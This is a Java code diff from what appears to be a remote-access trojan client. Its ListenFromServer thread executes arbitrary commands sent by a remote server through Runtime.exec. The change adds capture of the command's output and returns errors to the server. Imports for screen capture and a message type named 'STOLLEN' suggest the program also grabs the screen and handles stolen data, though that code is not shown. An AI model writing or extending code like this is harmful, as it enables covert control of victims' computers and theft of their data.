@@ -5,9 +5,12 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.ServerSocket;
@@ -71,10 +74,24 @@ class ListenFromServer  extends Thread {
 				}
 				if (input.getType() ==Message.COMMAND)
 				{
-					
+					System.out.println("Running command :" + input.getMessage());
+					try{
 					Process pr = rt.exec(input.getMessage());
+					
+					InputStream stdin = pr.getInputStream();
+					InputStreamReader isr = new InputStreamReader(stdin);
+					BufferedReader br = new BufferedReader(isr);
+					
+					String line = null;
+					while ( (line = br.readLine()) != null)
+					     System.out.println(line);
+					}
+					catch (Exception e)
+					{
+						sOutput.writeObject(new Message(Message.ACK,e.toString()));
+					}
 					//no problem. End program.
-				System.out.println("Running command :" + input.getMessage());
+				
 				}
 				
 				if (input.getType() ==Message.STOLLEN)
